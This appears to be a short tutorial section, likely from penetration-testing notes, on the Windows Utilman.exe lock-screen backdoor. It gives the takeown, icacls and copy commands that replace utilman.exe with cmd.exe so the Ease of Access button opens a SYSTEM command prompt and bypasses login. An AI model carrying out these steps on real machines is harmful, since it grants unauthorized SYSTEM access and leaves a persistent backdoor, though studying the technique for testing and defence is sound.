#### What is Utilman?
Utilman is a built-in Windows application used to ***provide Ease of Access options during the lock screen***. When we click the ease of access button on the login screen, it executes `C:\Windows\System32\Utilman.exe` with SYSTEM privileges. If we ***replace it with a copy of `cmd.exe`***, we can bypass the login screen again.

**To replace the `utilman.exe`, we need to do the same as we did on `Sticky Keys`**

#### 1. Take Ownership of Utilman.exe
```cmd
takeown /f c:\Windows\System32\utilman.exe
```

#### 2. Grant Full Permission
```cmd
icacls C:\Windows\System32\utilman.exe /grant Administrator:F
```

#### 3. Replace the Utilman.exe
```cmd
copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
```

4. To trigger our terminal, we will lock our screen from the start button.
5. Click on the `Ease of Access` button. Since we replaced `Utilman.exe` with `cmd.exe`, we will get a command prompt with SYSTEM privileges.